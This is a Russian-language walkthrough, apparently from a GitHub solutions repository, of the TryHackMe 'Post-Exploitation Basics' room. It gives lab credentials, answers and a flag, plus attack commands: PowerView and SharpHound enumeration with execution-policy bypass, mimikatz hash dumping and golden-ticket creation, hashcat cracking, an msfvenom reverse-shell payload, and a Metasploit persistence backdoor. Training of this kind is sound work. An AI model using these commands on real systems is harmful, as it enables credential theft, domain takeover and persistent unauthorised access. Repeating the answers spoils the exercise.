[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Post-Exploitation Basics](https://tryhackme.com/r/room/postexploit) 

Всего 8 заданий:
## Задание 1
В этом зале будут рассмотрены все основы постэксплуатации; мы поговорим обо всем, начиная с перечисления после 
эксплуатации с помощью Powerview и Bloodhound, дампа хэшей и атак с использованием золотых билетов с помощью 
Mimikatz, базового сбора информации с помощью инструментов и журналов сервера Windows, а затем мы завершим этот зал, 
рассказав об основах поддержания доступа с помощью модуля persistence metaploit и создания бэкдора в машину для 
получения мгновенной оболочки Meterpreter в случае выключения или сброса системы.

Эта комната будет связана с реальными приложениями и, скорее всего, не поможет вам с ctfs, однако эта комната даст 
вам отличные начальные знания о том, как работать с сетью после того, как вы получите оболочку на машине.  



Для начала работы в этой комнате разверните машину и приступайте к следующему разделу по перечислению с помощью PowerView.

Загрузка этой машины может занять до 10 минут.

и до 10 минут для подключения к машине по ssh или rdp

### Ответить на вопросы ниже
Разверните машину
```commandline
Ответ не нужен
```

## Задание 2
Чтобы запустить эту комнату, вам необходимо подключиться к машине по RDP или SSH , ваши учетные данные следующие:

IP вашего компьютера MACHINE_IP

Имя пользователя: Администратор

Пароль:  P@$$W0rd

Доменное имя: КОНТРОЛЛЕР



Powerview — это мощный скрипт PowerShell от PowerShell Empire, который можно использовать для перечисления домена 
после того, как вы уже получили оболочку в системе. 

Мы сосредоточимся на том, как запустить PowerView и получить пользователей и группы из него.

Я уже нашел время и установил PowerView на машину.



1.)  Запустите Powershell - powershell -ep bypass  -ep обходит политику выполнения PowerShell, позволяя вам легко 
запускать скрипты. 



2.) Запустите PowerView -. .\Downloads\PowerView.ps1

3.) Перечислите пользователей домена -Get-NetUser | select cn    



4.) Перечислите группы доменов -Get-NetGroup -GroupName *admin*    

  

Теперь перечислите домен дальше самостоятельно

Вот шпаргалка, которая поможет вам с командами:  https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Шпаргалка Кредит: HarmJ0y

### Ответить на вопросы ниже
Какая общая папка не установлена по умолчанию?
```commandline
Share
```
Какая операционная система работает внутри сети, помимо Windows Server 2019?
```commandline
Windows 10 Enterprise Evaluation
```
Я спрятал флаг внутри, чтобы пользователи могли его найти
```commandline
POST{P0W3RV13W_FTW}
```

## Задание 3
Bloodhound — это графический интерфейс, позволяющий визуально составить карту сети. Этот инструмент вместе с 
SharpHound, который похож на PowerView, берет пользователя, группы, доверительные отношения и т. д. сети и собирает 
их в файлы .json для использования внутри Bloodhound.  

Мы сосредоточимся на том, как собрать файлы .json и как импортировать их в Bloodhound.

Я уже потратил время на установку SharpHound на машину. 



Установка BloodHound -

1.)apt-get install bloodhound    

2.) neo4j console- учетные данные по умолчанию -> neo4j:neo4j

Получение добычи с помощью SharpHound -

1.) powershell -ep bypassто же самое, что и с PowerView

2.). .\Downloads\SharpHound.ps1    

3.)Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip    



4.) Перенесите папку loot.zip на машину атакующего.

примечание: вы можете использовать scp для передачи файла, если вы используете ssh

Картографирование сети с помощью BloodHound -

1.) bloodhound Запустите это на машине злоумышленника, а не на машине жертвы.

2.) Войдите в систему, используя те же учетные данные, которые вы указали в Neo4j.



3.) Внутри Bloodhound найдите этот значок   и импортируйте папку loot.zip.

Примечание: в некоторых версиях BloodHound кнопка импорта не работает. Чтобы обойти эту проблему, просто перетащите 
папку loot.zip в Bloodhound, чтобы импортировать файлы .json. 

4.) Чтобы просмотреть графическую сеть, откройте меню и выберите запросы. Это предоставит вам список предварительно 
скомпилированных запросов на выбор. 



Запросы могут быть такими простыми, как поиск всех администраторов домена -



Или такой же сложный, как кратчайший путь к высокоценным целям -



Существует множество запросов на выбор и перечисление соединений внутри сети.

### Ответить на вопросы ниже
Какая служба также является администратором домена
```commandline
SQLSERVICE
```
Какие два пользователя являются Kerberoastable?
```commandline
SQLSERVICE, KRBTGT
```

## Задание 4
Mimikatz — очень популярный и мощный инструмент постэксплуатации, в основном используемый для сброса учетных данных 
пользователей внутри сети Active Directory. 

Мы сосредоточимся на дампе NTLM- хэшей с помощью mimikatz, а затем на взломе этих хэшей с помощью hashcat.

Я уже потратил время, чтобы установить mimikatz на машину



Дамп хэшей с помощью mimikatz -

1.) cd Downloads && mimikatz.exe это перейдет в каталог, в котором хранится mimikatz, а также запустит двоичный файл 
mimikatz 



2.) privilege::debug Убедитесь, что на выходе отображается «Privilege '20' ok» — это гарантирует, что вы запускаете 
mimikatz от имени администратора; если вы не запустите mimikatz от имени администратора, mimikatz не будет работать 
должным образом.  



3.) lsadump::lsa /patch Сбросьте эти хэши!



Взломайте эти хеши с помощью hashcat﻿

1.)hashcat -m 1000 <hash> rockyou.txt    



Mimikatz имеет множество применений, помимо того, что он является отличным инструментом для сброса хэшей, мы 
рассмотрим еще один из таких способов использования mimikatz в следующей задаче, создав золотой билет с помощью 
mimikatz.  

### Ответить на вопросы ниже
какой пароль у Machine1?
```commandline
Password1
```
Что такое хэш Machine2?
```commandline
c39f2beb3d2ec06a62cb887fb391dee0
```

## Задание 5
Снова используем тот же инструмент, что и в предыдущем задании, однако на этот раз мы будем использовать его для 
создания золотого билета. 

Сначала мы выгрузим хэш и sid пользователя krbtgt, затем создадим золотой билет и используем его для открытия новой 
командной строки, позволяющей нам получить доступ к любой машине в сети. 

Я уже потратил время на установку mimikatz на машину.



Сбросьте хэш krbtgt -

1.)cd downloads && mimikatz.exe    

2.) privilege::debug убедитесь, что это выводит [привилегия "20" ok]

3.) lsadump::lsa /inject /name:krbtgt  Это выводит хэш и идентификатор безопасности учетной записи Kerberos Ticket 
Granting Ticket, позволяя вам создать золотой билет. 



Обратите внимание на то, что выделено красным, это вам понадобится для создания золотого билета.

Создайте Золотой Билет -

1.)kerberos::golden /user: /domain: /sid: /krbtgt: /id:    

Используйте Золотой Билет для доступа к другим машинам -

1.) misc::cmd - Это откроет новую командную строку с повышенными привилегиями для всех машин.

2.) Получите доступ к другим машинам! - Теперь у вас будет еще одна командная строка с доступом ко всем другим 
машинам в сети. 

К сожалению, поскольку tryhackme в настоящее время не поддерживает сети, вы не сможете получить доступ к другим 
машинам, однако я рекомендую вам самостоятельно добавить другие машины к этому контроллеру домена и попробовать эти 
атаки.  

### Ответить на вопросы ниже
Я понимаю, как работает атака с золотым билетом и как использовать атаку с золотым билетом для перемещения по сети.
```commandline
Ответ не нужен
```

## Задание 6
Поскольку серверы редко когда-либо входят в систему, если только это не требуется для обслуживания, это дает вам 
простой способ перечисления только с использованием встроенных функций Windows, таких как диспетчер сервера. Если у 
вас уже есть администратор домена, у вас есть много прав доступа к диспетчеру сервера для изменения доверительных 
отношений, добавления или удаления пользователей, просмотра групп, это может быть точкой входа для поиска других 
пользователей с другой конфиденциальной информацией на их машинах или поиска других пользователей в доменной сети с 
доступом к другим сетям, чтобы перейти к другой сети и продолжить тестирование.     

Единственный способ получить доступ к диспетчеру сервера — подключиться к серверу по протоколу RDP и получить доступ 
к серверу через RDP-подключение. 

Мы рассмотрим только основы, такие как просмотр пользователей, групп и доверительных отношений, однако есть много 
других вещей, которые вы можете сделать, перечислив их с помощью диспетчера сервера. 

Это также может быть способом легко определить, какой тип межсетевого экрана используется в сети, если вы еще не 
сделали этого. 

Подключитесь к виртуальной машине с помощью RDP :

IP вашего компьютера MACHINE_IP

Имя пользователя:  Администратор

Пароль:  P@$$W0rd

Доменное имя:  КОНТРОЛЛЕР

Перечисление с помощью диспетчера серверов -

Вот как будет выглядеть Windows Server Manager, когда вы впервые его откроете. Основные вкладки, которые будут 
наиболее интересны, это вкладки инструментов и управления. На вкладке инструментов вы найдете большую часть своей 
информации, такой как пользователи, группы, доверительные отношения, компьютеры. Вкладка управления позволит вам 
добавлять роли и функции, однако это, вероятно, будет довольно быстро воспринято системным администратором.   

Не беспокойтесь об AD CS, AD DS, DNS или файловых службах и службах хранения данных — они настроены для эксплуатации 
Active Directory и не имеют особого смысла для последующей эксплуатации. 



Перейдите на вкладку «Инструменты» и выберите «Пользователи и компьютеры Active Directory».

Это выведет список всех пользователей домена, а также некоторые другие полезные вкладки, такие как группы и компьютеры.

Некоторые системные администраторы не понимают, что вы, как злоумышленник, можете видеть описания учетных записей 
пользователей, поэтому они могут установить пароли учетных записей служб внутри описания. Посмотрите описание и 
найдите пароль службы SQL.  

### Ответить на вопросы ниже
Какой инструмент позволяет просматривать журналы событий?
```commandline
Event Viewer
```
Какой пароль у службы SQL?
```commandline
MYpassword123#
```

## Задание 7
Существует довольно много способов сохранения доступа к машине или сети. Мы рассмотрим довольно простой способ 
сохранения доступа: сначала настроим оболочку meterpreter, а затем воспользуемся модулем persistence metasploit, 
который позволит нам создать в системе бэкдор-сервис, который предоставит нам мгновенную оболочку meterpreter, если 
машина будет выключена или перезагружена.   

Существуют и другие способы сохранения доступа, такие как продвинутые бэкдоры и руткиты, однако они выходят за рамки 
этой темы. 

Это потребует немного больше ручной настройки, чем другие задачи, поэтому рекомендуется иметь предварительные знания 
о msfvenom и metasploit. 

Создание полезной нагрузки с помощью msfvenom﻿

1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe  это создаст базовую оболочку 
Windows Meterpreter для обратного TCP 

2.) Перенесите полезную нагрузку с машины атакующего на целевую машину.

3.) use exploit/multi/handler - это создаст прослушиватель на порту, на который вы его настроили.

4.) Настройте нашу полезную нагрузку так, чтобы она представляла собой оболочку Windows Meterpreter: 
`set payload windows/meterpreter/reverse_tcp`

5.) После установки вашего IP-адреса THM в качестве «LHOST» запустите прослушиватель с помощьюrun

6.) Запуск двоичного файла на машине Windows вернет вам оболочку meterpreter на вашем хосте — вернемся к этому.

7.) Убедитесь, что у нас есть оболочка meterpreter, в которой мы затем background запустим модуль сохранения.

Запустите модуль сохранения -

1.) use exploit/windows/local/persistence По умолчанию этот модуль будет отправлять полезную нагрузку каждые 10 
секунд, однако вы можете установить любое желаемое время. 

2.) set session 1 установите сеанс на тот сеанс, который мы перевели в фоновый режим в meterpreter (вы можете 
использовать sessions команду в metasploit для получения списка активных сеансов)



Если система по какой-либо причине будет выключена или перезагружена, вы потеряете сеанс meterpreter. Однако с 
помощью модуля сохранения вы создаете бэкдор в системе, к которому можете получить доступ в любое время с помощью 
многофункционального обработчика metasploit и настройки полезной нагрузки, windows/meterpreter/reverse_tcp 
позволяющей вам отправлять на машину еще одну полезную нагрузку meterpreter и открывать новый сеанс meterpreter.   



Здесь вы можете видеть, что сеанс завершается, однако как только мы снова запускаем обработчик, мы получаем оболочку 
meterpreter благодаря службе сохранения. 

Существуют и другие способы сохранения доступа, такие как добавление пользователей и руткитов, однако я предоставлю 
вам возможность провести собственные исследования и лабораторные работы по этим темам. 

Ответить на вопросы ниже
Я понимаю, как установить бэкдор в системе с помощью модуля сохранения.
```commandline
Ответ не нужен
```

## Задание 8
Последние мысли -

Эта комната дала хорошее начало постэксплуатации, однако есть много других методов, которые постоянно развиваются. Я 
предлагаю вам выйти и провести собственное исследование, найти собственные инструменты, которые вам нравятся для 
постэксплуатации. Я надеюсь сделать еще одну комнату, похожую на эту, охватывающую более продвинутые темы, такие как 
более глубокие бэкдоры и трояны, поворот, подмена токенов и атаки с использованием серебряных билетов. Я надеюсь, 
что эта комната помогла вам лучше понять, как постэксплуатация работает в реальном мире.    

Ресурсы -

https://blog.harmj0y.net/
https://adsecurity.org/?page_id=1821
https://metasploit.help.rapid7.com/docs/about-post-exploitation
http://www.pentest-standard.org/index.php/Post_Exploitation
https://offsec.red/mimikatz-cheat-sheet/
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
Используемые инструменты/вредоносное ПО -

https://github.com/gentilkiwi/mimikatz
https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
### Ответить на вопросы ниже
Я понимаю основы постэксплуатации
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)